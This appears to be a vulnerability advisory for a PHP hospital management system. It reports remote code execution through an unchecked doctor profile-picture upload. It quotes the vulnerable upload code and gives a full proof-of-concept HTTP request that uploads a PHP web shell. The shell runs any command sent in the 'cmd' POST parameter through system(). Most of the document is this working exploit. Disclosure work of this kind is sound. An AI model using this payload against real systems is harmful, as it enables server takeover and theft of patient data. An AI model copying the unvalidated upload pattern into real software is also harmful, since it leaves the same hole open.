# Remote Code Execution via Arbitrary File Upload in Hospital Management System

## Vendor Homepage:
> https://codeastro.com/hospital-management-system-in-php-with-source-code-adv/


## Code
``` php

		if(isset($_POST['update_profile']))
		{
			$doc_fname=$_POST['doc_fname'];
			$doc_lname=$_POST['doc_lname'];
			$doc_id=$_SESSION['doc_id'];
            $doc_email=$_POST['doc_email'];
           // $doc_pwd=sha1(md5($_POST['doc_pwd']));
            $doc_dpic=$_FILES["doc_dpic"]["name"];
		    move_uploaded_file($_FILES["doc_dpic"]["tmp_name"],"assets/images/users/".$_FILES["doc_dpic"]["name"]);

            //sql to insert captured values
			$query="UPDATE his_docs SET doc_fname=?, doc_lname=?,  doc_email=?, doc_dpic=? WHERE doc_id = ?";
			$stmt = $mysqli->prepare($query);
			$rc=$stmt->bind_param('ssssi', $doc_fname, $doc_lname, $doc_email, $doc_dpic, $doc_id);
			$stmt->execute();

```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /Hospital-PHP/backend/doc/his_doc_update-account.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------284657390227237097933480442506
Content-Length: 764
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/Hospital-PHP/backend/doc/his_doc_update-account.php
Cookie: PHPSESSID=qr4c4tv56jj7l2j77ju7tpu9h8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------284657390227237097933480442506

Content-Disposition: form-data; name="doc_fname"

-----------------------------284657390227237097933480442506

Content-Disposition: form-data; name="doc_lname"
-----------------------------284657390227237097933480442506

Content-Disposition: form-data; name="doc_email"

-----------------------------284657390227237097933480442506
Content-Disposition: form-data; name="doc_dpic"; filename="x2.php"
Content-Type: image/jpeg

<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();

-----------------------------284657390227237097933480442506

Content-Disposition: form-data; name="update_profile"

-----------------------------284657390227237097933480442506--
```

## Screenshot
![image](https://github.com/user-attachments/assets/5c2cc01c-4c31-42b2-a36b-4519e324c153)


## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
